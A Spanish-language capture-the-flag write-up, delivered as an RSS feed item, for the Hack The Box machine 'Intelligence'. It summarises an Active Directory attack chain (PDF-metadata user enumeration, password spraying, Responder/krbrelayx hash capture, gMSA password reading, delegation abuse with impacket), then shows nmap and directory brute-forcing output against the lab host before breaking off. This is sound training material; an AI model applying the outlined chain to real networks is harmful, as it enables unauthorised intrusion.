<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>impacket on sckull</title>
    <link>https://sckull.github.io/tags/impacket/</link>
    <description>Recent content in impacket on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Sat, 27 Nov 2021 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/impacket/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Intelligence</title>
        <link>https://sckull.github.io/posts/intelligence/</link>
        <pubDate>Sat, 27 Nov 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 27 Nov 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/intelligence/</guid>
        <description>En Intelligence realizamos una enumeracion de usuarios en los metadatos de PDFs para luego realizar &amp;lsquo;Password Spraying&amp;rsquo; lo que nos dio acceso a un primer usuario.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/intelligence/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;En Intelligence realizamos una enumeracion de usuarios en los metadatos de PDFs para luego realizar &amp;lsquo;Password Spraying&amp;rsquo; lo que nos dio acceso a un primer usuario. Encontramos un script en un recurso de samba lo que nos permitió obtener el hash de un segundo usuario tras ejecutar Responder y krbrelayx. Bloodhound nos mostró que uno de los usuarios tiene la caracteristica de leer constraseñas de cuentas gMSA, este ultimo tambien tiene caracteristicas &amp;lsquo;Delegation&amp;rsquo; sobre el DC, con esta informacion obtuvimos acceso como administrador con gMSADumper y impacket.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/357&#34;&gt;Intelligence&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.248&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/22435&#34;&gt;Micah&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/22435&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[7.2, 6.5, 4.9, 5.1, 3.5],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[5, 5, 5, 5, 5],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;nmap&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos con nmap nos muestra multiples puertos abiertos: http (80), kerberos (88), ldap (389, 636, 3268, 3269), dns (53), winrm (5985), smb (139, 445).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Wed Jul  7 23:38:51 2021 as: nmap -Pn -sV -sC -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49685,49686,49706,49712,53942 -oN scans 10.10.10.248&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.248 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.248&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.069s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;server time: 2021-07-08 09:33:53Z&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: intelligence.htb0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2021-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2022-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2021-07-08T09:35:40+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; +5h55m05s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: intelligence.htb0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2021-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2022-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2021-07-08T09:35:39+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; +5h55m04s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: intelligence.htb0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2021-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2022-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2021-07-08T09:35:40+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; +5h55m05s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: intelligence.htb0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2021-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2022-04-19T00:43:16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2021-07-08T09:35:39+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; +5h55m04s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
53942/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 5h55m03s, deviation: 2s, median: 5h55m03s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled and required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2021-07-08T09:34:55
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Jul  7 23:40:35 2021 -- 1 IP address (1 host up) scanned in 104.26 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;web-site&#34;&gt;Web Site&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina estatica en el puerto 80, además muestra algunos PDFs que contienen texto &lt;a href=&#34;https://es.wikipedia.org/wiki/Lorem_ipsum&#34;&gt;Lorem Ipsum&lt;/a&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/intelligence/Screenshot_20210707_222845.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;directory-brute-forcing&#34;&gt;Directory Brute Forcing&lt;/h2&gt;
&lt;p&gt;Feroxbuster mostró unicamente la carpeta donde estan los PDFs.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;####################] - 28m   220545/220545  127/s   http://intelligence.htb/&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;####################] - 30m   220545/220545  120/s   http://intelligence.htb/documents&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;####################] - 29m   220545/220545  124/s   http://intelligence.htb/Documents&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;subdominios&#34;&gt;Subdominios&lt;/h2&gt;
&lt;p&gt;Realizamos una enumeracion de subdominios utilizando &lt;a href=&#34;https://github.com/rbsec/dnscan&#34;&gt;dnscan&lt;/a&gt;. Encontramos algunos subdominios y direccion ipv6, los subdominios no muestra informacion por http.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
